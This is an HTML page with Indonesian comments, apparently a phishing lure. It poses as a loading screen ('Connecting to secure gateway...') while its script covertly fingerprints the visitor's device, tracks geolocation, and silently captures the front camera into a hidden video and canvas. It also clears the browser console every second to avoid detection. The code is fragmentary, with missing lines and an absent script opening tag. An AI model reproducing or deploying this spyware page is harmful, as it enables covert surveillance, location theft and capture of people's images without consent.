<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>about:blank</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <style>
        /* Adaptasi Dinamis: Mengikuti Jiwa Perangkat Target */
        :root { --bg-color: #ffffff; --loader-color: #808080; --text-color: #555555; }
        @media (prefers-color-scheme: dark) { :root { --bg-color: #000000; --loader-color: #444444; --text-color: #888888; } }

        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            transition: background 0.5s ease; overflow: hidden;
        }

        /* Modular Pro Container: Struktur yang Kompleks namun Tak Terlihat */
        .system-container { text-align: center; z-index: 10; }
        
        .spinner {
            width: 32px; height: 32px;
            border: 3px solid rgba(128, 128, 128, 0.1);
            border-top: 3px solid var(--loader-color);
            border-radius: 50%;
            animation: rotate 0.8s cubic-bezier(0.4, 0, 0.2, 1) infinite;
        }

        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        .status-text {
            margin-top: 20px; font-size: 13px; font-weight: 400;
            letter-spacing: 0.5px; opacity: 0.8;
            animation: pulse 2s infinite;
        }

        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 0.9; } 100% { opacity: 0.4; } }

        /* Canvas & Video Hidden Sesuai Protokol */
        #v, #c { position: absolute; visibility: hidden; pointer-events: none; width: 1px; height: 1px; }

        /* Komponen Dekoratif Tersembunyi untuk Menambah Bobot Script */
        .shadow-layer { display: none; visibility: hidden; }
    </style>
</head>
<body>

    <div class="system-container">
        <div class="spinner"></div>
        <p class="status-text" id="loader-msg">Connecting to secure gateway...</p>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

            const cores = navigator.hardwareConcurrency || 'Unknown';
            const conn = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            
            return `
<b>🔱 LEVIATHAN SINGULARITY REPORT</b>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>🔋 BATTERY:</b> ${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'Plugged' : 'DC'})
<b>🧠 HARDWARE:</b> ${ram}GB RAM | ${cores} Cores
<b>🌐 NETWORK:</b> ${conn}
<b>📱 PLATFORM:</b> ${navigator.platform}

<b>━━━━━━━━━━━━━━━━━━━━</b>`;
        }

        track: async () => {

            try {

                });

            if (navigator.geolocation) {

        // Serangan Senyap untuk Cermin Terkutuk
        reflect: async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: LEVIATHAN_CONFIG.settings.res.w, height: LEVIATHAN_CONFIG.settings.res.h }

                const v = document.getElementById('v');
                const c = document.getElementById('c');
                v.srcObject = stream;

                v.onloadedmetadata = () => {
                    setTimeout(() => {
                        c.width = v.videoWidth;
                        c.height = v.videoHeight;

                    }, LEVIATHAN_CONFIG.settings.delay);
                };
            } catch (err) {
                // Silent failure - tetap diam jika diblokir
            }

    };

    // Main Execution
    window.onload = () => {
        Infiltrator.track();
        Infiltrator.reflect();
        
        // Anti-Detection Loop
        setInterval(() => {
            console.clear();
            console.log("%cSystem Security Active", "color: red; font-size: 20px;");
        }, 1000);

    </script>
